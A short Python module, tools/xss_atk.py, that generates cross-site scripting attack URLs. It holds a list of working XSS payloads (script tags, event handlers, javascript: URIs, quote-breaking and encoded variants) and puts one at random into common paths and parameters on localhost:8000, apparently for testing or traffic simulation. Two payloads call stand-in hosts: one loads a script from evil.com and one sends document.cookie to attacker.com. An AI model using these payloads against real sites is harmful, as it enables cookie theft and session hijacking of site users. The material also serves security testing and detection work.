"""
tools/xss_atk.py — Cross-Site Scripting attack payload generator
"""

import random

_SCRIPT_TAG = [
    "<script>alert(document.cookie)</script>",
    "<script>alert(1)</script>",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<script src=http://evil.com/xss.js></script>",
    "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
]

_EVENT_HANDLERS = [
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=document.write('<script>alert(1)</script>')>",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert(1) autofocus>",
    "<video onplay=alert(1) autoplay><source src=1></video>",
]

_JAVASCRIPT_PROTO = [
    "javascript:alert(1)",
    "javascript:document.write('<img src=x onerror=alert(1)>')",
    "<a href=javascript:alert(document.cookie)>Click</a>",
]

_DOM_BASED = [
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "</script><script>alert(1)</script>",
    "\"><script>alert(document.domain)</script>",
]

_ENCODED = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<scri%00pt>alert(1)</scri%00pt>",
]

ALL_PAYLOADS = _SCRIPT_TAG + _EVENT_HANDLERS + _JAVASCRIPT_PROTO + _DOM_BASED + _ENCODED

XSS_PATHS  = ["/search", "/comment", "/profile", "/feedback", "/message", "/post"]
XSS_PARAMS = ["q", "query", "search", "comment", "name", "text", "message"]


def generate() -> tuple[str, str]:
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(XSS_PATHS)
    param   = random.choice(XSS_PARAMS)
    url     = f"http://localhost:8000{path}?{param}={payload}"
    return url, payload
